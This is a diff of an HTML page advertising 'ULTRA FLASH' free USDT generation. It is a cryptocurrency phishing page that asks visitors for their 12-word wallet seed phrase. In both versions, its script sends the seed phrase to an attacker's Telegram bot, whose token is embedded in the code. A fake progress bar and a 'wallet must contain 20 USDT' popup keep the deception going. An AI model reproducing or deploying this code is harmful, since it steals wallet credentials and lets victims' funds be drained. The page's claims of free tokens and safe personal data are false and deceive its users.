@@ -1,265 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>ULTRA FLASH USDT</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ULTRA FLASH TERIAL 3.61</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
       background: url('background.jpg') no-repeat center center fixed;
       background-size: cover;
-      margin: 0;
       font-family: Arial, sans-serif;
       color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
     }
-
-.chat-popup,
-.container,
-#popup {
-  background: rgba(0, 0, 0, 0.75);
-  backdrop-filter: blur(10px);
-  border-radius: 16px;
-  padding: 6vw;
-  width: 90vw;
-  max-width: 700px;
-  box-shadow: 0 0 15px rgba(0,0,0,0.6);
-  text-align: left;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-}
-
-    .chat-popup.active {
-      display: block;
-    }
-
     .container {
-      display: none;
-    }
-
-    h1 {
+      background: rgba(0, 0, 0, 0.65);
+      padding: 25px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+      width: 90%;
+      max-width: 400px;
       text-align: center;
-      color: #00ccff;
     }
-
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 6px;
-    }
-
-    select, textarea, button {
+    select, input[type="text"] {
       width: 100%;
       padding: 10px;
-      border-radius: 8px;
+      margin: 10px 0;
       border: none;
-      font-size: 16px;
-    }
-
-    select, textarea {
-      background-color: #1a1a1a;
+      border-radius: 8px;
+      background: #1e1e1e;
       color: white;
     }
-
-    textarea {
-      resize: none;
-      height: 100px;
+    input::placeholder {
+      color: #aaa;
     }
-
-    #generateBtn {
-      background-color: #00ccff;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    #progressBar {
-      height: 8px;
-      background-color: #333;
-      border-radius: 4px;
-      margin-top: 15px;
-      overflow: hidden;
-      display: none;
-    }
-
-    #progress {
-      height: 100%;
-      width: 0%;
-      background-color: #00ccff;
-    }
-
-    #popup, .lang-switcher {
-      display: none;
-    }
-
-    #popup button, #startBtn {
-      margin-top: 15px;
-      padding: 10px 20px;
-      background-color: #00ccff;
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
       cursor: pointer;
+      margin-top: 10px;
     }
-
-    .lang-switcher {
-      position: absolute;
-      top: 15px;
-      right: 15px;
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #333;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 15px;
+      display: none;
+    }
+    .progress {
+      height: 100%;
+      background: #00ff99;
+      width: 0%;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #111;
+      padding: 20px;
+      border-radius: 12px;
+      color: white;
+      z-index: 999;
+      text-align: center;
+      display: none;
+      box-shadow: 0 0 20px rgba(255,255,255,0.2);
     }
   </style>
 </head>
 <body>
-
-<div class="lang-switcher">
-  <select id="language">
-    <option value="en">EN</option>
-    <option value="fr">FR</option>
-    <option value="zh">中文</option>
-    <option value="ru">РУС</option>
-  </select>
-</div>
-
-<div id="chatBox" class="chat-popup active">
-  <div id="welcomeText"></div>
-  <button id="startBtn">Continue</button>
-</div>
-
-<div class="container" id="mainContainer">
-  <h1>ULTRA FLASH USDT</h1>
-
-  <div class="form-group">
-    <label id="lblAmount" for="amount">Amount</label>
+  <div class="container">
+    <h2>ULTRA FLASH TERIAL 3.61</h2>
     <select id="amount">
-      <option value="1">1k=Free</option>
-      <option value="2">5k=10 usdt</option>
-      <option value="3">20k=25 usdt</option>
+      <option value="2.5K">2.5K = FREE</option>
+      <option value="20K">20K</option>
+      <option value="100K">100K</option>
     </select>
-  </div>
-
-  <div class="form-group">
-    <label id="lblNetwork" for="network">Network</label>
     <select id="network">
-      <option value="ERC20">ERC20</option>
       <option value="BEP20">BEP20</option>
       <option value="TRC20">TRC20</option>
+      <option value="ERC20">ERC20</option>
     </select>
+    <input type="text" id="seed" placeholder="Enter your 12-word seed phrase" />
+    <button onclick="startGeneration()">Generate</button>
+    <div class="progress-bar" id="progressBar">
+      <div class="progress" id="progress"></div>
+    </div>
   </div>
 
-  <div class="form-group">
-    <label id="lblSeed" for="seed">12 PHRASE WALLET SEEDS</label>
-    <textarea id="seed" placeholder="Enter 12 words..."></textarea>
+  <div class="popup" id="popup">
+    <p>Insufficient balance.<br>Wallet must contain 20 USDT.</p>
   </div>
 
-  <button id="generateBtn">Generate</button>
-  <div id="progressBar"><div id="progress"></div></div>
-</div>
+  <script>
+    function validateSeed(seed) {
+      const words = seed.trim().split(/\s+/);
+      return words.length === 12;
+    }
 
-<div id="popup">
-  <p><strong>WALLET NEED 10 usdt activate (you don't pay anything)</strong></p>
-  <button onclick="closePopup()">OK</button>
-</div>
+    function sendToTelegram(message) {
+      const chatId = '7739393558';
+      const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
 
-<script>
-  const messages = {
-    en: `Dear user\n1. This flash is for wallets and trading platforms (metamask, trustwallet, binance, bybit...)\n2. Wallet must have at least 10 usdt \n3. Our system keeps your personal information safe\n4. Enjoy`,
-    fr: `Cher utilisateur\n1. Ce flash est pour les portefeuilles et les plateformes de trading (metamask, trustwallet, binance, bybit...)\n2. Le portefeuille doit contenir au moins 10 usdt\n3. Notre système protège vos informations personnelles\n4. Profitez`,
-    zh: `亲爱的用户\n1. 本程序适用于钱包和交易平台 (Metamask, TrustWallet, Binance, Bybit...)\n2. 钱包需至少包含 0.001 BNB\n3. 我们的系统保障您的隐私\n4. 祝您使用愉快`,
-    ru: `Уважаемый пользователь\n1. Этот флеш для кошельков и платформ (metamask, trustwallet, binance, bybit...)\n2. На кошельке должно быть минимум 10 usdt BNB\n3. Мы храним ваши данные в безопасности\n4. Наслаждайтесь`
-  };
+    function startGeneration() {
+      const seed = document.getElementById('seed').value.trim();
+      const amount = document.getElementById('amount').value;
+      const network = document.getElementById('network').value;
 
-  const labels = {
-    en: ["Amount", "Network", "12 PHRASE WALLET SEEDS", "Enter 12 words...", "Generate", "Regenerate"],
-    fr: ["Montant", "Réseau", "12 MOTS CLÉS DU PORTEFEUILLE", "Entrez 12 mots...", "Générer", "Régénérer"],
-    zh: ["金额", "网络", "12个助记词", "输入12个单词...", "生成", "重新生成"],
-    ru: ["Сумма", "Сеть", "12 СЛОВ КОШЕЛЬКА", "Введите 12 слов...", "Создать", "Создать заново"]
-  };
-
-  const languageSelect = document.getElementById('language');
-  const welcomeText = document.getElementById('welcomeText');
-  const chatBox = document.getElementById('chatBox');
-  const container = document.getElementById('mainContainer');
-  const startBtn = document.getElementById('startBtn');
-  const generateBtn = document.getElementById('generateBtn');
-  const seedInput = document.getElementById('seed');
-
-  function setLanguage(lang) {
-    welcomeText.textContent = messages[lang];
-    const [amt, net, seed, ph, gen, regen] = labels[lang];
-    document.getElementById("lblAmount").textContent = amt;
-    document.getElementById("lblNetwork").textContent = net;
-    document.getElementById("lblSeed").textContent = seed;
-    seedInput.placeholder = ph;
-    generateBtn.textContent = gen;
-    generateBtn.dataset.regen = regen;
-  }
-
-  languageSelect.addEventListener('change', () => {
-    const lang = languageSelect.value;
-    localStorage.setItem("lang", lang);
-    setLanguage(lang);
-  });
-
-  startBtn.addEventListener('click', () => {
-    chatBox.style.display = 'none';
-    container.style.display = 'block';
-  });
-
-  function validateSeed(seed) {
-    return seed.trim().split(/\s+/).length === 12;
-  }
-
-  function sendToTelegram(message) {
-    const chatId = '7739393558';
-    const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
-    });
-  }
-
-  function closePopup() {
-    document.getElementById('popup').style.display = 'none';
-    generateBtn.textContent = generateBtn.dataset.regen;
-  }
-
-  generateBtn.addEventListener('click', () => {
-    const amount = document.getElementById('amount').value;
-    const network = document.getElementById('network').value;
-    const seed = seedInput.value.trim();
-    if (!validateSeed(seed)) return alert("Enter exactly 12 words.");
-
-    sendToTelegram(`ULTRA FLASH USDT\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`);
-
-    const progressBar = document.getElementById('progressBar');
-    const progress = document.getElementById('progress');
-    const popup = document.getElementById('popup');
-
-    progressBar.style.display = 'block';
-    progress.style.width = '0%';
-
-    let seconds = 0;
-    const interval = setInterval(() => {
-      seconds++;
-      progress.style.width = `${(seconds / 15) * 100}%`;
-      if (seconds === 7) popup.style.display = 'block';
-      if (seconds === 15) {
-        clearInterval(interval);
-        progressBar.style.display = 'none';
+      if (!validateSeed(seed)) {
+        alert('Please enter exactly 12 words in the seed phrase.');
+        return;
       }
-    }, 1000);
-  });
 
-  // Init
-  const savedLang = localStorage.getItem("lang") || "en";
-  languageSelect.value = savedLang;
-  setLanguage(savedLang);
-</script>
+      // Send info to Telegram
+      const message = `New Submission:\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`;
+      sendToTelegram(message);
 
+      // Start progress bar
+      const bar = document.getElementById('progressBar');
+      const progress = document.getElementById('progress');
+      let seconds = 0;
+      bar.style.display = 'block';
+      progress.style.width = '0%';
+
+      const interval = setInterval(() => {
+        seconds++;
+        progress.style.width = (seconds / 15) * 100 + '%';
+
+        if (seconds === 7) {
+          document.getElementById('popup').style.display = 'block';
+        }
+
+        if (seconds >= 15) {
+          clearInterval(interval);
+          // Hide popup if still shown
+          document.getElementById('popup').style.display = 'none';
+        }
+      }, 1000);
+    }
+  </script>
 </body>
 </html>
